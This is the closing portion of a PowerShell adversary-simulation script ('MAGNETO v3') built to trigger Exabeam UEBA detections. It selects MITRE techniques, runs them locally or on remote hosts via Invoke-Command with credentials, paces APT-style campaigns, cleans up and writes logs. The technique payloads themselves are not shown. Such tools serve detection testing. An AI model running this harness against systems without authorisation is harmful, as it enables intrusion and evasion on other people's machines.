            Write-Host "  $($tech.ID): $($tech.Name)$adminReq$domainReq$aptTag" -ForegroundColor Yellow
        }
    }
    
    Write-Host "`nTotal techniques: $($techniques.Count) (including APT-specific)" -ForegroundColor Green
    exit 0
}

# Set console encoding
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Set hacker vibe colors
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "Green"
Clear-Host

# MAGNETO Banner
Write-Host @"
 __  __    _    ____ _   _ _____ _____ ___  
|  \/  |  / \  / ___| \ | | ____|_   _/ _ \ 
| |\/| | / _ \| |  _|  \| |  _|   | || | | |
| |  | |/ ___ \ |_| | |\  | |___  | || |_| |
|_|  |_/_/   \_\____|_| \_|_____| |_| \___/ 
                                             
  Stealth Attack Simulator v$scriptVersion - Powered by Elite Ethical Hacking
  Breach. Evade. Exfil. All Native. All Stealth.
  MITRE-Aligned Chaos for Exabeam UEBA Demos.
"@ -ForegroundColor Red

Write-Host "Initializing MAGNETO v3... Random Seed: $RandomSeed" -ForegroundColor Cyan

# Remote Execution Check
if ($RemoteComputer) {
    Write-Host "`n[REMOTE MODE] Target: $RemoteComputer" -ForegroundColor Yellow
    if ($RemoteCredential) {
        Write-Host "[REMOTE MODE] Using credentials: $($RemoteCredential.UserName)" -ForegroundColor Yellow
    } else {
        Write-Host "[REMOTE MODE] Using current user credentials" -ForegroundColor Yellow
    }
    Write-Host ""
}

# Remote Execution Wrapper Function
function Invoke-TechniqueAction {
    param(
        [scriptblock]$Action,
        [string]$TechniqueId
    )

    if ($RemoteComputer) {
        # Execute remotely via PowerShell Remoting
        try {
            # Create a new scriptblock that includes necessary context for remote execution
            $remoteScriptBlock = {
                param($ActionScript, $TechniqueId, $RandomSeed)

                # Initialize remote context
                $random = New-Object System.Random($RandomSeed)
                $global:executionResults = New-Object System.Collections.ArrayList
                $script:tempScript = $null
                $script:createdUser = $null

                # Define Log-AttackStep function for remote context
                function Log-AttackStep {
                    param([string]$Message, [string]$TechniqueId)
                    # Remote logging is handled differently - just output
                    Write-Verbose "[$TechniqueId] $Message" -Verbose
                }

                # Execute the technique action
                try {
                    $ActionScriptBlock = [scriptblock]::Create($ActionScript)
                    & $ActionScriptBlock

                    # Check if technique actually succeeded by examining results
                    $techniqueSucceeded = $false
                    if ($global:executionResults.Count -gt 0) {
                        # Check the last result added (should be for this technique)
                        $lastResult = $global:executionResults[$global:executionResults.Count - 1]
                        $techniqueSucceeded = $lastResult.Success -eq $true
                    }

                    return @{
                        Success = $techniqueSucceeded
                        Results = $global:executionResults
                        Error = if (-not $techniqueSucceeded -and $global:executionResults.Count -gt 0) {
                            $global:executionResults[$global:executionResults.Count - 1].Error
                        } else {
                            $null
                        }
                    }
                } catch {
                    return @{Success=$false; Error=$_.Exception.Message; Results=$null}
                }
            }

            $params = @{
                ComputerName = $RemoteComputer
                ScriptBlock = $remoteScriptBlock
                ArgumentList = @($Action.ToString(), $TechniqueId, $RandomSeed)
                ErrorAction = 'Stop'
            }

            if ($RemoteCredential) {
                $params.Credential = $RemoteCredential
            }

            $result = Invoke-Command @params

            # Handle remote execution results and merge them into local results
            if ($result) {
                # Always merge remote results first
                if ($result.Results) {
                    foreach ($remoteResult in $result.Results) {
                        $remoteResult.Remote = $true
                        $null = $global:executionResults.Add($remoteResult)
                    }
                }

                # Then check success status
                if ($result.Success -eq $false) {
                    if ($result.Error) {
                        Write-Host "[!] Remote technique failed: $($result.Error)" -ForegroundColor Red
                    }
                    return $false
                }
            }

            return $true
        } catch {
            Write-Host "[!] Remote execution failed for $TechniqueId`: $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    } else {
        # Execute locally
        try {
            & $Action
            return $true
        } catch {
            Write-Host "[!] Local execution failed for $TechniqueId`: $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    }
}

# APT Campaign Execution Function
function Execute-APTCampaign {
    param(
        [string]$APTGroup,
        [switch]$Cleanup
    )
    
    Write-Host "`n" -NoNewline
    Write-Host "=" * 70 -ForegroundColor Red
    Write-Host " INITIATING $APTGroup CAMPAIGN SIMULATION " -ForegroundColor Red -BackgroundColor Black
    Write-Host "=" * 70 -ForegroundColor Red
    Write-Host ""
    
    $campaign = $aptCampaigns[$APTGroup]
    if (-not $campaign) {
        Write-Host "Unknown APT group: $APTGroup" -ForegroundColor Red
        return
    }
    
    Write-Host "Campaign: $($campaign.Name)" -ForegroundColor Cyan
    Write-Host "Description: $($campaign.Description)" -ForegroundColor Gray
    Write-Host "Timing Profile: $($campaign.TimingProfile)" -ForegroundColor Gray
    Write-Host "C2 Infrastructure: $($campaign.C2Style)" -ForegroundColor Gray
    Write-Host ""
    
    # Get techniques for this APT
    $aptTechniques = @()
    
    # Get APT-specific techniques
    $aptSpecific = $techniques | Where-Object { $_.APTGroup -contains $APTGroup -or $_.APTGroup -eq $APTGroup }
    $aptTechniques += $aptSpecific
    
    # Get general techniques matching the campaign's MITRE IDs
    foreach ($techniqueID in $campaign.Techniques) {
        $tech = $techniques | Where-Object { $_.ID -eq $techniqueID } | Select-Object -First 1
        if ($tech -and $tech -notin $aptTechniques) {
            $aptTechniques += $tech
        }
    }
    
    if ($aptTechniques.Count -eq 0) {
        Write-Host "No techniques available for $APTGroup" -ForegroundColor Yellow
        return
    }
    
    Write-Host "Executing $($aptTechniques.Count) techniques..." -ForegroundColor Green
    Write-Host ""
    
    # Determine timing based on profile
    $timingDelays = @{
        "Rapid" = 2..5
        "Methodical" = 10..30
        "Patient" = 30..60
        "Targeted" = 5..15
        "Aggressive" = 1..3
        "Persistent" = 20..40
    }
    
    $delayRange = if ($timingDelays[$campaign.TimingProfile]) { $timingDelays[$campaign.TimingProfile] } else { 5..10 }
    
    # Execute techniques
    $counter = 0
    foreach ($technique in $aptTechniques) {
        $counter++
        $percentComplete = ($counter / $aptTechniques.Count) * 100
        
        Write-Progress -Activity "$APTGroup Campaign Execution" `
                       -Status "[$counter/$($aptTechniques.Count)] $($technique.ID): $($technique.Name)" `
                       -PercentComplete $percentComplete `
                       -CurrentOperation "Tactic: $($technique.Tactic)"
        
        # Check validation requirements
        $canExecute = $true
        if ($technique.ValidationRequired) {
            $validationResult = & $technique.ValidationRequired
            if (-not $validationResult) {
                $validationReason = if ($technique.ValidationRequired.ToString() -match "Test-AdminPrivileges") {
                    "Requires administrator privileges"
                } elseif ($technique.ValidationRequired.ToString() -match "Test-DomainJoined") {
                    "Requires domain-joined system"
                } else {
                    "Validation check failed"
                }

                Write-Host "[$($technique.ID)] SKIPPED - $validationReason" -ForegroundColor Yellow
                Log-AttackStep "SKIPPED: $($technique.Name) - $validationReason" $technique.ID

                $null = $global:executionResults.Add(@{
                    ID = $technique.ID
                    Success = $false
                    Reason = $validationReason
                    Skipped = $true
                })
                $canExecute = $false
            }
        }
        
        if ($canExecute) {
            if ($WhatIf) {
                Write-Host "[WHATIF] Would execute: [$($technique.ID)] $($technique.Name)" -ForegroundColor Cyan
                Write-Host "  Tactic: $($technique.Tactic)" -ForegroundColor DarkCyan
                if ($technique.Description) {
                    Write-Host "  Description: $($technique.Description.WhyTrack.Substring(0, [Math]::Min(150, $technique.Description.WhyTrack.Length)))..." -ForegroundColor DarkGray
                }
            } else {
                Log-AttackStep "Executing: $($technique.Name)" $technique.ID
                $null = $global:actuallyExecutedTechniqueIDs.Add($technique.ID)
                & $technique.Action
                Show-BlinkEffect
            }
        }
        
        # APT-specific timing delay
        if ($counter -lt $totalTechniques.Count) {
            $delay = Get-Random -Minimum $delayRange[0] -Maximum $delayRange[-1]
            Write-Host "Waiting $delay seconds (APT timing simulation)..." -ForegroundColor DarkGray
            Start-Sleep -Seconds $delay
        }
    }
    
    Write-Progress -Activity "$APTGroup Campaign Execution" -Completed
    
    # Cleanup if requested
    if ($Cleanup) {
        Write-Host "`nInitiating cleanup..." -ForegroundColor Cyan
        
        $techniquesWithCleanup = $aptTechniques | Where-Object { $_.CleanupAction -ne $null }
        foreach ($tech in $techniquesWithCleanup) {
            if ($tech.ID -in $global:actuallyExecutedTechniqueIDs) {
                Log-AttackStep "Cleaning: $($tech.Name)" $tech.ID
                & $tech.CleanupAction
            }
        }
    }
    
    Write-Host "`n$APTGroup Campaign Simulation Complete!" -ForegroundColor Green
}

# Main Execution Logic
if ($APTCampaign) {
    # Execute APT Campaign mode
    Execute-APTCampaign -APTGroup $APTCampaign -Cleanup:$Cleanup
} elseif ($IndustryVertical) {
    # Execute Industry Vertical mode
    Write-Host "`n=== INDUSTRY VERTICAL SIMULATION MODE ===" -ForegroundColor Magenta

    # Get vertical details
    $vertical = $industryVerticals[$IndustryVertical]

    if (!$vertical) {
        Write-Host "[ERROR] Unknown industry vertical: $IndustryVertical" -ForegroundColor Red
        Write-Host "`nRun: .\MAGNETO_v3.ps1 -ListIndustryVerticals" -ForegroundColor Yellow
        exit 1
    }

    Write-Host "Industry: $($vertical.DisplayName)" -ForegroundColor Cyan
    Write-Host "Risk Profile: $($vertical.RiskProfile)" -ForegroundColor Yellow
    Write-Host "Techniques: $($vertical.Techniques.Count)" -ForegroundColor Green
    Write-Host "APT Groups: $($vertical.APTGroups -join ', ')" -ForegroundColor Magenta
    Write-Host ""

    # Filter techniques for this vertical
    $verticalTechniqueIds = $vertical.Techniques
    $filteredTechniques = $techniques | Where-Object { $_.ID -in $verticalTechniqueIds }

    if ($filteredTechniques.Count -eq 0) {
        Write-Host "[ERROR] No techniques found for vertical: $IndustryVertical" -ForegroundColor Red
        exit 1
    }

    # Show how many techniques were matched
    if ($filteredTechniques.Count -lt $verticalTechniqueIds.Count) {
        Write-Host "[WARNING] Only $($filteredTechniques.Count) of $($verticalTechniqueIds.Count) techniques found in script" -ForegroundColor Yellow
        $missingIds = $verticalTechniqueIds | Where-Object { $_ -notin ($filteredTechniques | Select-Object -ExpandProperty ID) }
        Write-Host "  Missing technique IDs: $($missingIds -join ', ')" -ForegroundColor DarkYellow
    } else {
        Write-Host "Found all $($filteredTechniques.Count) techniques for this vertical" -ForegroundColor Green
    }

    Write-Host "Simulating attack targeting: $($vertical.DisplayName)" -ForegroundColor Yellow
    Write-Host "Primary threats simulated: $($vertical.PrimaryThreats -join ', ')" -ForegroundColor Gray
    Write-Host ""

    # Industry Vertical mode ALWAYS runs ALL techniques for the vertical
    # (TechniqueCount parameter is ignored in this mode)
    $selectedTechniques = $filteredTechniques

    Write-Host "Running ALL $($selectedTechniques.Count) techniques for this industry vertical" -ForegroundColor Cyan

    Write-Host "Commencing Industry-Targeted Breach Simulation..." -ForegroundColor Magenta
    $counter = 0
    $totalTechniques = $selectedTechniques.Count

    foreach ($tech in $selectedTechniques) {
        $counter++
        $percentComplete = ($counter / $totalTechniques) * 100

        Write-Progress -Activity "Executing Industry Vertical Simulation: $IndustryVertical" `
                       -Status "[$counter/$totalTechniques] $($tech.ID): $($tech.Name)" `
                       -PercentComplete $percentComplete `
                       -CurrentOperation "Tactic: $($tech.Tactic)"

        # Validation check
        $canExecute = $true
        if ($tech.ValidationRequired) {
            $validationResult = & $tech.ValidationRequired
            if (-not $validationResult) {
                $validationReason = if ($tech.ValidationRequired.ToString() -match "Test-AdminPrivileges") {
                    "Requires administrator privileges"
                } elseif ($tech.ValidationRequired.ToString() -match "Test-DomainJoined") {
                    "Requires domain-joined system"
                } else {
                    "Validation check failed"
                }

                Write-Host "[$($tech.ID)] SKIPPED - $validationReason" -ForegroundColor Yellow
                Log-AttackStep "SKIPPED: $($tech.Name) - $validationReason" $tech.ID

                $null = $global:executionResults.Add(@{
                    ID = $tech.ID
                    Success = $false
                    Reason = $validationReason
                    Skipped = $true
                })
                $canExecute = $false
            }
        }

        if ($canExecute) {
            if ($WhatIf) {
                Write-Host "[WHATIF] Would execute: [$($tech.ID)] $($tech.Name)" -ForegroundColor Cyan
                Write-Host "  Tactic: $($tech.Tactic)" -ForegroundColor DarkCyan
                if ($tech.Description) {
                    Write-Host "  Description: $($tech.Description.WhyTrack.Substring(0, [Math]::Min(150, $tech.Description.WhyTrack.Length)))..." -ForegroundColor DarkGray
                }
            } else {
                Log-AttackStep "Executing: $($tech.Name)" $tech.ID
                $null = $global:actuallyExecutedTechniqueIDs.Add($tech.ID)

                # Execute technique
                $executionSuccess = Invoke-TechniqueAction -Action $tech.Action -TechniqueId $tech.ID

                if (-not $executionSuccess) {
                    Write-Host "[$($tech.ID)] Execution failed" -ForegroundColor Red
                }

                Show-BlinkEffect
            }
        }

        # Delay between techniques
        if ($counter -lt $totalTechniques) {
            Write-Host "Waiting $DelayBetweenTechniques seconds before next technique..." -ForegroundColor DarkGray
            Start-Sleep -Seconds $DelayBetweenTechniques
        }
    }

    Write-Progress -Activity "Executing Industry Vertical Simulation" -Completed

    # Cleanup if requested
    if ($Cleanup -and !$WhatIf) {
        Write-Host "`nInitiating cleanup..." -ForegroundColor Cyan

        $techniquesWithCleanup = $selectedTechniques | Where-Object { $_.CleanupAction -ne $null }
        foreach ($tech in $techniquesWithCleanup) {
            if ($tech.ID -in $global:actuallyExecutedTechniqueIDs) {
                Log-AttackStep "Cleaning: $($tech.Name)" $tech.ID
                & $tech.CleanupAction
            }
        }
    }

    Write-Host "`n$($vertical.DisplayName) Industry Vertical Simulation Complete!" -ForegroundColor Green
    # Skip to end to avoid duplicate execution
} else {
    # Normal MAGNETO execution (existing logic from original script)

    # Filter techniques based on parameters
    if ($IncludeTechniques.Count -gt 0) {
        $filteredTechniques = $techniques | Where-Object { $_.ID -in $IncludeTechniques }
    } elseif ($RunAll) {
        $filteredTechniques = $techniques
    } elseif ($IncludeTactics.Count -gt 0) {
        $filteredTechniques = $techniques | Where-Object { $_.Tactic -in $IncludeTactics }
    } else {
        $filteredTechniques = $techniques | Where-Object {
            $_.Tactic -notin $ExcludeTactics -and $_.ID -notin $ExcludeTechniques
        }
    }
    
    # Mode Selection
    if ($RunAll -or $IncludeTechniques.Count -gt 0 -or $RunAllForTactics) {
        if ($RunAll) {
            $mode = 'RunAll'
        } elseif ($IncludeTechniques.Count -gt 0) {
            $mode = 'IncludeTechniques'
        } elseif ($RunAllForTactics) {
            $mode = 'TacticAll'
        }
        Write-Host "Mode auto-selected based on parameters: $mode" -ForegroundColor Cyan
    } else {
        # If -AttackMode is specified, use it. Otherwise, default to Random.
        $mode = if ($AttackMode) { $AttackMode } else { 'Random' }
        Write-Host "Mode selected: $mode" -ForegroundColor Cyan
    }
    
    Start-Sleep -Seconds 1
    
    # Select techniques based on mode
    if ($mode -eq 'RunAll') {
        $selectedTechniques = $filteredTechniques
    } elseif ($mode -eq 'IncludeTechniques') {
        $selectedTechniques = $filteredTechniques
    } elseif ($mode -eq 'Random') {
        $actualCount = [Math]::Min($TechniqueCount, $filteredTechniques.Count)
        $selectedTechniques = $filteredTechniques | Get-Random -Count $actualCount -SetSeed $RandomSeed
    } else {
        # Chain mode - uses date-based seed for consistent daily selections
        $tacticsOrder = @('Discovery', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access', 'Lateral Movement', 'Command and Control', 'Exfiltration')

        if ($IncludeTactics.Count -gt 0) {
            $tacticsOrder = $tacticsOrder | Where-Object { $_ -in $IncludeTactics }
        } else {
            $tacticsOrder = $tacticsOrder | Where-Object { $_ -notin $ExcludeTactics }
        }

        $selectedTechniques = @()
        $tacticIndex = 0
        foreach ($tac in $tacticsOrder) {
            $candidates = $filteredTechniques | Where-Object { $_.Tactic -eq $tac }
            if ($candidates.Count -gt 0) {
                if ($RunAllForTactics) {
                    $selectedTechniques += $candidates
                } else {
                    # Use seed + tactic index to ensure same selection per day per tactic
                    $tacticSeed = $RandomSeed + $tacticIndex
                    $selectedTechniques += $candidates | Get-Random -Count 1 -SetSeed $tacticSeed
                }
            }
            $tacticIndex++
        }
    }
    
    # Execute selected techniques
    Write-Host "Commencing Breach Simulation... Stay Low, Move Fast." -ForegroundColor Magenta
    $counter = 0
    $totalTechniques = $selectedTechniques.Count
    
    foreach ($tech in $selectedTechniques) {
        $counter++
        $percentComplete = ($counter / $totalTechniques) * 100
        
        Write-Progress -Activity "Executing MITRE Techniques" `
                       -Status "[$counter/$totalTechniques] $($tech.ID): $($tech.Name)" `
                       -PercentComplete $percentComplete `
                       -CurrentOperation "Tactic: $($tech.Tactic)"
        
        # Validation check
        $canExecute = $true
        if ($tech.ValidationRequired) {
            $validationResult = & $tech.ValidationRequired
            if (-not $validationResult) {
                $validationReason = if ($tech.ValidationRequired.ToString() -match "Test-AdminPrivileges") {
                    "Requires administrator privileges"
                } elseif ($tech.ValidationRequired.ToString() -match "Test-DomainJoined") {
                    "Requires domain-joined system"
                } else {
                    "Validation check failed"
                }

                Write-Host "[$($tech.ID)] SKIPPED - $validationReason" -ForegroundColor Yellow
                Log-AttackStep "SKIPPED: $($tech.Name) - $validationReason" $tech.ID

                $null = $global:executionResults.Add(@{
                    ID = $tech.ID
                    Success = $false
                    Reason = $validationReason
                    Skipped = $true
                })
                $canExecute = $false
            }
        }
        
        if ($canExecute) {
            if ($WhatIf) {
                Write-Host "[WHATIF] Would execute: [$($tech.ID)] $($tech.Name)" -ForegroundColor Cyan
                Write-Host "  Tactic: $($tech.Tactic)" -ForegroundColor DarkCyan
                if ($tech.Description) {
                    Write-Host "  Description: $($tech.Description.WhyTrack.Substring(0, [Math]::Min(150, $tech.Description.WhyTrack.Length)))..." -ForegroundColor DarkGray
                }
            } else {
                Log-AttackStep "Executing: $($tech.Name)" $tech.ID
                $null = $global:actuallyExecutedTechniqueIDs.Add($tech.ID)

                # Execute technique (local or remote)
                $executionSuccess = Invoke-TechniqueAction -Action $tech.Action -TechniqueId $tech.ID

                if (-not $executionSuccess) {
                    Write-Host "[$($tech.ID)] Execution failed" -ForegroundColor Red
                }

                Show-BlinkEffect
            }
        }
        
        # Delay between techniques
        if ($counter -lt $totalTechniques) {
            Write-Host "Waiting $DelayBetweenTechniques seconds before next technique..." -ForegroundColor DarkGray
            Start-Sleep -Seconds $DelayBetweenTechniques
        }
    }
    
    Write-Progress -Activity "Executing MITRE Techniques" -Completed
    
    # Cleanup if requested
    if ($Cleanup) {
        Write-Host "Initiating Evasion Cleanup... Leaving No Trace." -ForegroundColor Cyan
        
        $successfulTechniqueIDs = @()
        foreach ($result in $global:executionResults) {
            if ($result.Success -eq $true) {
                $successfulTechniqueIDs += $result.ID
            }
        }
        
        $techniquesWithCleanup = @()
        foreach ($tech in $selectedTechniques) {
            if ($tech.CleanupAction -and ($tech.ID -in $successfulTechniqueIDs)) {
                $techniquesWithCleanup += $tech
            }
        }
        
        if ($techniquesWithCleanup.Count -gt 0) {
            Write-Host "Found $($techniquesWithCleanup.Count) techniques requiring cleanup" -ForegroundColor Cyan
            
            foreach ($tech in $techniquesWithCleanup) {
                Log-AttackStep "Cleaning: $($tech.Name)" $tech.ID
                & $tech.CleanupAction
                Show-BlinkEffect "CLEANED."
            }
        }
    }
}

# Generate Execution Summary
Write-Host "`nExecution Summary:" -ForegroundColor Cyan

$successCount = 0
$skippedCount = 0
$failCount = 0

foreach ($result in $global:executionResults) {
    if ($result.Skipped -eq $true) {
        $skippedCount++
    } elseif ($result.Success -eq $true) {
        $successCount++
    } else {
        $failCount++
    }
}
Write-Host "  Total Attempted: $($global:executionResults.Count)" -ForegroundColor Cyan
Write-Host "  Successful: $successCount" -ForegroundColor Green
Write-Host "  Skipped (validation): $skippedCount" -ForegroundColor Yellow
Write-Host "  Failed: $failCount" -ForegroundColor Red

# Show details of skipped techniques if any
if ($skippedCount -gt 0) {
    Write-Host "`nSkipped Techniques:" -ForegroundColor Yellow
    foreach ($result in $global:executionResults | Where-Object { $_.Skipped -eq $true }) {
        $tech = $techniques | Where-Object { $_.ID -eq $result.ID } | Select-Object -First 1
        if ($tech) {
            Write-Host "  [$($result.ID)] $($tech.Name)" -ForegroundColor DarkYellow
            Write-Host "    Reason: $($result.Reason)" -ForegroundColor Gray
        }
    }
}

# Generate and Open Log File
$attackLogsPath = Join-Path $PSScriptRoot "Logs\Attack Logs"
if (-not (Test-Path $attackLogsPath)) {
    New-Item -ItemType Directory -Path $attackLogsPath -Force | Out-Null
}

$logFileName = if ($APTCampaign) {
    "MAGNETO_APT_$($APTCampaign)_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
} else {
    "MAGNETO_AttackLog_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
}

$logFile = Join-Path $attackLogsPath $logFileName

$logContent = @("MAGNETO v3 Stealth Attack Log")
$logContent += "Version: $scriptVersion"
$logContent += "Run on: $(Get-Date)"
$logContent += "Author: Syed Hasan Rizvi"
$logContent += ""

if ($APTCampaign) {
    $logContent += "APT Campaign: $APTCampaign"
    $logContent += "Campaign Name: $($aptCampaigns[$APTCampaign].Name)"
    $logContent += ""
}

$logContent += "Configuration:"
$logContent += "  Random Seed: $RandomSeed"
$logContent += "  Delay Between Techniques: $DelayBetweenTechniques seconds"
$logContent += ""
$logContent += "Execution Summary:"
$logContent += "  Total Attempted: $($global:executionResults.Count)"
$logContent += "  Successful: $successCount"
$logContent += "  Skipped (validation): $skippedCount"
$logContent += "  Failed: $failCount"
$logContent += ""
$logContent += "TTPs Covered (MITRE ATT&CK):"

# Add technique details to log
foreach ($techID in $global:actuallyExecutedTechniqueIDs) {
    $tech = $techniques | Where-Object { $_.ID -eq $techID } | Select-Object -First 1
    if ($tech) {
        $result = $global:executionResults | Where-Object { $_.ID -eq $techID } | Select-Object -First 1
        $status = if ($result.Success -eq $true) { "SUCCESS" } else { "FAILED" }
        
        $logContent += "  $($tech.ID): $($tech.Name) [Tactic: $($tech.Tactic)] - $status"
        
        if ($tech.APTGroup) {
            $logContent += "    APT Group: $($tech.APTGroup)"
        }
        
        $logContent += "    Why Track: $($tech.Description.WhyTrack)"
        $logContent += "    Real-World Usage: $($tech.Description.RealWorldUsage)"
        $logContent += ""
    }
}

$logContent += ""
$logContent += "Detailed Command Log:"
foreach ($cmd in $global:logCommands) {
    $logContent += $cmd
}

$logContent | Out-File -FilePath $logFile -Encoding UTF8
Write-Host "Log generated: $logFile" -ForegroundColor Green

Write-Host "`nSimulation Complete. Check Exabeam UEBA for Anomalies Triggered." -ForegroundColor Green
Write-Host "Exfil Complete. Ghost Out." -ForegroundColor Red